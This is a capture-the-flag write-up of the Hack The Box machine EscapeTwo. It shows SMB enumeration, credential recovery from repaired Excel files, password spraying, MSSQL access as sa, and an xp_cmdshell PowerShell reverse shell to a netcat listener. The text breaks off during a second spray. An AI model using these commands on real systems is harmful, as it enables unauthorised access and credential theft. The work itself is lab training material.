---
title: "Hack The Box: EscapeTwo"
date: 2025-11-15
summary: "An Easy Windows-based machine where the target is compromised by downloading a corrupted Excel spreadsheet from an SMB share, repairing its file headers, and extracting plaintext credentials. These credentials grant MSSQL access as sa, enabling command execution via xp_cmdshell to retrieve cleartext configuration files on disk and obtain WinRM access. Privileges are escalated by abusing WriteOwner rights on a certificate service account to modify a certificate template via ESC4 and issue an administrative certificate for full domain compromise."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Easy"
link: "https://app.hackthebox.com/machines/EscapeTwo"
tags:
  - ace-writeowner
  - active-directory
  - bloodhound
  - bloodhound-ce-python
  - certipy-ad
  - credentials-in-configuration-files
  - credentials-in-public-shares
  - esc4
  - evil-winrm
  - hexeditor
  - impacket-dacledit
  - impacket-mssqlclient
  - impacket-owneredit
  - libreoffice
  - netcat
  - netexec
  - nmap
  - password-spraying
  - pth-net
  - reverse-shell
  - smbclient
  - xp-cmdshell
  - xxd
---

### Provided Information

"As is common in real life Windows pentests, you will start this box with credentials for the following account: `rose`:`KxEPkKe6R8su`"

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/top-tcp 10.129.7.30
Nmap scan report for 10.129.7.30
Host is up, received echo-reply ttl 127 (0.20s latency).
Scanned at 2025-11-15 18:44:33 +04 for 104s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-15 10:44:53Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:   b55a:a63f:50ba:ed44:f865:820a:5b8e:f493
| SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-11-15T10:46:17+00:00; -3h59m57s from scanner time.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-15T10:46:17+00:00; -3h59m57s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:   b55a:a63f:50ba:ed44:f865:820a:5b8e:f493
| SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.129.7.30:1433:
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.7.30:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-11-15T10:46:17+00:00; -3h59m57s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-15T10:42:58
| Not valid after:  2055-11-15T10:42:58
| MD5:   f0fc:bafb:2975:5b26:31b7:87ec:e025:4f3e
| SHA-1: c0e7:bc10:c6aa:b021:c965:15ae:1bba:2fb5:d9b9:54e2
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-15T10:46:17+00:00; -3h59m57s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:   b55a:a63f:50ba:ed44:f865:820a:5b8e:f493
| SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:   b55a:a63f:50ba:ed44:f865:820a:5b8e:f493
| SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-11-15T10:46:17+00:00; -3h59m57s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-11-15T10:45:40
|_  start_date: N/A
|_clock-skew: mean: -3h59m57s, deviation: 0s, median: -3h59m57s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 60555/tcp): CLEAN (Timeout)
|   Check 2 (port 18139/tcp): CLEAN (Timeout)
|   Check 3 (port 42760/udp): CLEAN (Timeout)
|   Check 4 (port 49278/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

<SNIP>
```

As expected, the target is a Domain Controller (DC) given the running services.

Additionally, MSSQL is running on the target.

### Enumerating SMB

Let’s start by enumerating SMB shares with the given credentials using `netexec`:

```bash
$ netexec smb 10.129.7.30 -u rose -p KxEPkKe6R8su --shares
SMB         10.129.7.30     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.30     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SMB         10.129.7.30     445    DC01             [*] Enumerated shares
SMB         10.129.7.30     445    DC01             Share           Permissions     Remark
SMB         10.129.7.30     445    DC01             -----           -----------     ------
SMB         10.129.7.30     445    DC01             Accounting Department READ
SMB         10.129.7.30     445    DC01             ADMIN$                          Remote Admin
SMB         10.129.7.30     445    DC01             C$                              Default share
SMB         10.129.7.30     445    DC01             IPC$            READ            Remote IPC
SMB         10.129.7.30     445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.7.30     445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.7.30     445    DC01             Users           READ
```

There are two readable non-default shares, Users and Accounting Department.

Before browsing their contents, let’s generate a list of hosts for the `/etc/hosts` file:

```bash
$ netexec smb 10.129.7.30 -u rose -p KxEPkKe6R8su --generate-hosts-file hosts
SMB         10.129.7.30     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.30     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su

$ cat hosts | sudo tee -a /etc/hosts
10.129.7.30     DC01.sequel.htb sequel.htb DC01
```

Now let’s enumerate the Users share with `smbclient`:

```bash
$ smbclient //dc01.sequel.htb/Users -U 'rose%KxEPkKe6R8su'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Jun  9 17:42:11 2024
  ..                                 DR        0  Sun Jun  9 17:42:11 2024
  Default                           DHR        0  Sun Jun  9 15:17:29 2024
  desktop.ini                       AHS      174  Sat Sep 15 11:16:48 2018

                6367231 blocks of size 4096. 802505 blocks available
smb: \> cd Default
smb: \Default\> ls
  .                                 DHR        0  Sun Jun  9 15:17:29 2024
  ..                                DHR        0  Sun Jun  9 15:17:29 2024
  AppData                            DH        0  Sat Sep 15 11:19:00 2018
  Desktop                            DR        0  Sat Sep 15 11:19:00 2018
  Documents                          DR        0  Sun Jun  9 05:29:57 2024
  Downloads                          DR        0  Sat Sep 15 11:19:00 2018
  Favorites                          DR        0  Sat Sep 15 11:19:00 2018
  Links                              DR        0  Sat Sep 15 11:19:00 2018
  Music                              DR        0  Sat Sep 15 11:19:00 2018
  NTUSER.DAT                          A   262144  Sun Jun  9 05:29:57 2024
  NTUSER.DAT.LOG1                   AHS    57344  Sat Sep 15 10:09:26 2018
  NTUSER.DAT.LOG2                   AHS        0  Sat Sep 15 10:09:26 2018
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf    AHS    65536  Sun Jun  9 05:29:57 2024
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Sun Jun  9 05:29:57 2024
  NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Sun Jun  9 05:29:57 2024
  Pictures                           DR        0  Sat Sep 15 11:19:00 2018
  Saved Games                         D        0  Sat Sep 15 11:19:00 2018
  Videos                             DR        0  Sat Sep 15 11:19:00 2018
```

This appears to a be `C:\Users\<Username>\` directory of a Windows machine.

Since many files exist, let’s download all of them recursively:

```bash
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
<SNIP>
```

The result isn’t too interesting:

```bash
$ tree -a .
.
├── Default
│   ├── AppData
│   │   ├── Local
│   │   │   ├── Microsoft
│   │   │   │   ├── InputPersonalization
│   │   │   │   │   └── TrainedDataStore
│   │   │   │   ├── Windows
│   │   │   │   │   ├── CloudStore
│   │   │   │   │   ├── GameExplorer
│   │   │   │   │   ├── History
│   │   │   │   │   ├── INetCache
│   │   │   │   │   ├── INetCookies
│   │   │   │   │   ├── Shell
│   │   │   │   │   │   └── DefaultLayouts.xml
│   │   │   │   │   └── WinX
│   │   │   │   │       ├── Group1
│   │   │   │   │       │   ├── 1 - Desktop.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       ├── Group2
│   │   │   │   │       │   ├── 1 - Run.lnk
│   │   │   │   │       │   ├── 2 - Search.lnk
│   │   │   │   │       │   ├── 3 - Windows Explorer.lnk
│   │   │   │   │       │   ├── 4 - Control Panel.lnk
│   │   │   │   │       │   ├── 5 - Task Manager.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       └── Group3
│   │   │   │   │           ├── 01a - Windows PowerShell.lnk
│   │   │   │   │           ├── 01 - Command Prompt.lnk
│   │   │   │   │           ├── 02a - Windows PowerShell.lnk
│   │   │   │   │           ├── 02 - Command Prompt.lnk
│   │   │   │   │           ├── 03 - Computer Management.lnk
│   │   │   │   │           ├── 04-1 - NetworkStatus.lnk
│   │   │   │   │           ├── 04 - Disk Management.lnk
│   │   │   │   │           ├── 05 - Device Manager.lnk
│   │   │   │   │           ├── 06 - SystemAbout.lnk
│   │   │   │   │           ├── 07 - Event Viewer.lnk
│   │   │   │   │           ├── 08 - PowerAndSleep.lnk
│   │   │   │   │           ├── 09 - Mobility Center.lnk
│   │   │   │   │           ├── 10 - AppsAndFeatures.lnk
│   │   │   │   │           └── desktop.ini
│   │   │   │   ├── WindowsApps
│   │   │   │   └── Windows Sidebar
│   │   │   │       ├── Gadgets
│   │   │   │       └── settings.ini
│   │   │   └── Temp
│   │   └── Roaming
│   │       └── Microsoft
│   │           ├── Internet Explorer
│   │           │   └── Quick Launch
│   │           │       ├── Control Panel.lnk
│   │           │       ├── desktop.ini
│   │           │       ├── Server Manager.lnk
│   │           │       ├── Shows Desktop.lnk
│   │           │       └── Window Switcher.lnk
│   │           └── Windows
│   │               ├── CloudStore
│   │               ├── Network Shortcuts
│   │               ├── Printer Shortcuts
│   │               ├── Recent
│   │               ├── SendTo
│   │               │   ├── Compressed (zipped) Folder.ZFSendToTarget
│   │               │   ├── Desktop (create shortcut).DeskLink
│   │               │   ├── Desktop.ini
│   │               │   └── Mail Recipient.MAPIMail
│   │               ├── Start Menu
│   │               │   └── Programs
│   │               │       ├── Accessibility
│   │               │       │   ├── desktop.ini
│   │               │       │   ├── Magnify.lnk
│   │               │       │   ├── Narrator.lnk
│   │               │       │   └── On-Screen Keyboard.lnk
│   │               │       ├── Accessories
│   │               │       │   ├── desktop.ini
│   │               │       │   └── Notepad.lnk
│   │               │       ├── Maintenance
│   │               │       │   └── Desktop.ini
│   │               │       ├── System Tools
│   │               │       │   ├── Administrative Tools.lnk
│   │               │       │   ├── Command Prompt.lnk
│   │               │       │   ├── computer.lnk
│   │               │       │   ├── Control Panel.lnk
│   │               │       │   ├── Desktop.ini
│   │               │       │   ├── File Explorer.lnk
│   │               │       │   └── Run.lnk
│   │               │       └── Windows PowerShell
│   │               │           ├── desktop.ini
│   │               │           ├── Windows PowerShell ISE.lnk
│   │               │           ├── Windows PowerShell ISE (x86).lnk
│   │               │           ├── Windows PowerShell.lnk
│   │               │           └── Windows PowerShell (x86).lnk
│   │               └── Templates
│   ├── Desktop
│   ├── Documents
│   ├── Downloads
│   ├── Favorites
│   ├── Links
│   ├── Music
│   ├── NTUSER.DAT
│   ├── NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
│   ├── NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
│   ├── NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
│   ├── NTUSER.DAT.LOG1
│   ├── NTUSER.DAT.LOG2
│   ├── Pictures
│   ├── Saved Games
│   └── Videos
└── desktop.ini

49 directories, 59 files
```

Let’s switch to enumerating the Accounting Department share:

```bash
$ smbclient //dc01.sequel.htb/'Accounting Department' -U 'rose%KxEPkKe6R8su'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 14:52:21 2024
  ..                                  D        0  Sun Jun  9 14:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 14:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 14:52:07 2024
```

There are two Excel files. Let’s download them and view their contents:

```bash
smb: \> mget *
Get file accounting_2024.xlsx? y
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (12.9 KiloBytes/sec) (average 12.9 KiloBytes/sec)
Get file accounts.xlsx? y
getting file \accounts.xlsx of size 6780 as accounts.xlsx (8.5 KiloBytes/sec) (average 10.7 KiloBytes/sec)
```

When opening any of them with LibreOffice, I either get corrupted data or a launch failure.

Let’s check both files’ magic bytes:

```bash
$ xxd accounts.xlsx | head
00000000: 5048 0403 1400 0808 0800 f655 c958 0000  PH.........U.X..
00000010: 0000 0000 0000 0000 0000 1a00 0000 786c  ..............xl
00000020: 2f5f 7265 6c73 2f77 6f72 6b62 6f6f 6b2e  /_rels/workbook.
00000030: 786d 6c2e 7265 6c73 ad52 416a c330 10bc  xml.rels.RAj.0..
00000040: e715 62ef b5ec a484 522c e712 0ab9 a6e9  ..b.....R,......
00000050: 0384 bcb6 4c6c 4968 376d f2fb aa4d 681c  ....LlIh7m...Mh.
00000060: 08a1 079f c4cc 6a67 8661 cbd5 71e8 c527  ......jg.a..q..'
00000070: 46ea bc53 5064 3908 74c6 d79d 6b15 7cec  F..SPd9.t...k.|.
00000080: de9e 5e60 55cd ca2d f69a d317 b25d 2091  ..^`U..-.....] .
00000090: 761c 29b0 cce1 554a 3216 074d 990f e8d2  v.)...UJ2..M....

$ xxd accounting_2024.xlsx | head
00000000: 5048 0403 1400 0600 0800 0000 2100 4137  PH..........!.A7
00000010: 82cf 6e01 0000 0405 0000 1300 0802 5b43  ..n...........[C
00000020: 6f6e 7465 6e74 5f54 7970 6573 5d2e 786d  ontent_Types].xm
00000030: 6c20 a204 0228 a000 0200 0000 0000 0000  l ...(..........
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

Those aren’t the exact magic bytes that should be in the header of an Excel files. The real bytes can be found on [Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures):

![Figure 1](/assets/images/writeups/hack-the-box-escapetwo/hack-the-box-escapetwo-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

Let’s use `hexeditor` to fix both files’ magic bytes and make them match with those in the Wikipedia image:

```bash
$ hexeditor accounts.xlsx

$ hexeditor accounting_2024.xlsx
```

Now let’s try opening the `accounting_2024.xlsx`:

![Figure 2](/assets/images/writeups/hack-the-box-escapetwo/hack-the-box-escapetwo-fig-3.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

It successfully opens, but data in it isn’t too important.

### Exploiting Oscar

Let’s check the data in the `accounts.xlsx` file:

![Figure 3](/assets/images/writeups/hack-the-box-escapetwo/hack-the-box-escapetwo-fig-4.png)

<figcaption class="blog-image-caption">Figure 3</figcaption>

Now this is surely more important: a list of usernames and passwords.

Let’s put them into files and check their validity with `netexec` against SMB:

```bash
$ netexec smb sequel.htb -u usernames.txt -p passwords.txt --continue-on-success
SMB         10.129.7.30     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.30     445    DC01             [-] sequel.htb\angela:0fwz<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\oscar:0fwz<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\kevin:0fwz<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\sa:0fwz<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\angela:86Lx<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [+] sequel.htb\oscar:86Lx<REDACTED>
SMB         10.129.7.30     445    DC01             [-] sequel.htb\kevin:86Lx<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\sa:86Lx<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\angela:Md9<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\kevin:Md9<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\sa:Md9<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\angela:MSS<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\kevin:MSS<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\sa:MSS<REDACTED> STATUS_LOGON_FAILURE
```

We got one hit with Oscar.

### Exploiting MSSQL Admin User

Let’s also check their validity against MSSQL (especially the `sa` user):

```bash
$ netexec mssql sequel.htb -u usernames.txt -p passwords.txt --continue-on-success --local-auth
MSSQL       10.129.7.30     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.129.7.30     1433   DC01             [-] DC01\angela:0fwz<REDACTED> (Login failed for user 'angela'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\oscar:0fwz<REDACTED> (Login failed for user 'oscar'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\kevin:0fwz<REDACTED> (Login failed for user 'kevin'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\sa:0fwz<REDACTED> (Login failed for user 'sa'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\angela:86Lx<REDACTED> (Login failed for user 'angela'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\oscar:86Lx<REDACTED> (Login failed for user 'oscar'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\kevin:86Lx<REDACTED> (Login failed for user 'kevin'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\sa:86Lx<REDACTED> (Login failed for user 'sa'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\angela:Md9<REDACTED> (Login failed for user 'angela'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\oscar:Md9<REDACTED> (Login failed for user 'oscar'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\kevin:Md9<REDACTED> (Login failed for user 'kevin'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\sa:Md9<REDACTED> (Login failed for user 'sa'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\angela:MSS<REDACTED> (Login failed for user 'angela'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\oscar:MSS<REDACTED> (Login failed for user 'oscar'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [-] DC01\kevin:MSS<REDACTED> (Login failed for user 'kevin'. Please try again with or without '--local-auth')
MSSQL       10.129.7.30     1433   DC01             [+] DC01\sa:MSS<REDACTED> (Pwn3d!)
```

Nice, we can log into MSSQL with the `sa` user.

Let’s do that using `impacket-mssqlclient`:

```bash
$ impacket-mssqlclient sequel.htb/sa:'MSS<REDACTED>'@dc01.sequel.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (sa  dbo@master)>
```

### RCE as Sql_svc

As we are the `sa` user which usually is the administrator user, let’s check if we can enable system command execution:

```bash
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> reconfigure
SQL (sa  dbo@master)> xp_cmdshell whoami
output
--------------
sequel\sql_svc
```

Nice, it was successfully enabled and it works.

Let’s use it to launch a reverse shell.

I’ll use a Powershell base64-encoded shell from revshells.com:

```bash
SQL (sa  dbo@master)> xp_cmdshell "powershell -e JABjAGwA<SNIP>"
```

```bash
$ rlwrap -cAr nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.7.30] 49465
whoami
sequel\sql_svc
PS C:\Windows\system32>
```

Nice, the reverse shell launched successfully.

No much user information is available in all home directories:

```bash
PS C:\Users> tree . /F
Folder PATH listing
Volume serial number is 3705-289D
C:\USERS
????Administrator
????Public
?   ????Accounting Department
?   ?       accounting_2024.xlsx
?   ?       accounts.xlsx
?   ?
?   ????Documents
?   ????Downloads
?   ????Music
?   ????Pictures
?   ????Videos
????ryan
????sql_svc
    ????Desktop
    ????Documents
    ????Downloads
    ????Favorites
    ????Links
    ????Music
    ????Pictures
    ????Saved Games
    ????Videos
```

There is another user called Ryan, so let’s note that down.

The root directory includes a non-default directory:

```bash
PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name                                                                
----                -------------         ------ ----                                                                
d-----        11/5/2022  12:03 PM                PerfLogs                                                            
d-r---         1/4/2025   7:11 AM                Program Files                                                       
d-----         6/9/2024   8:37 AM                Program Files (x86)                                                 
d-----         6/8/2024   3:07 PM                SQL2019                                                             
d-r---         6/9/2024   6:42 AM                Users                                                               
d-----         1/4/2025   8:10 AM                Windows 
```

This directory includes lots of files, one of which seems important:

```bash
PS C:\> cd SQL2019
PS C:\SQL2019> tree . /F
Folder PATH listing
Volume serial number is 3705-289D
C:\SQL2019
????ExpressAdv_ENU
    ?   AUTORUN.INF
    ?   MEDIAINFO.XML
    ?   PackageId.dat
    ?   SETUP.EXE
    ?   SETUP.EXE.CONFIG
    ?   sql-Configuration.INI
    ?   SQLSETUPBOOTSTRAPPER.DLL
    ?
    ????1033_ENU_LP
<SNIP>
```

```bash
PS C:\SQL2019> cat ExpressAdv_ENU/sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False"
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF<REDACTED>"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSS<REDACTED>"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

Many usernames and passwords exist in this file.

I’ll update my usernames and passwords files with all identified data, and launch a password spray attack against SMB:

```bash
$ netexec smb sequel.htb -u usernames.txt -p passwords.txt --continue-on-success
SMB         10.129.7.30     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.7.30     445    DC01             [-] sequel.htb\angela:0fwz7Q<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\oscar:0fwz7Q<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\kevin:0fwz7Q<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\sa:0fwz7Q<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\ryan:0fwz7Q<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\Administrator:0fwz7Q<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\:0fwz7Q<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [+] sequel.htb\oscar:86LxLB<REDACTED>
SMB         10.129.7.30     445    DC01             [-] sequel.htb\kevin:86LxLB<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\sa:86LxLB<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\ryan:86LxLB<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\Administrator:86LxLB<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\:86LxLB<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.7.30     445    DC01             [-] sequel.htb\angela:Md9Wlq<REDACTED> STATUS_LOGON_FAILURE
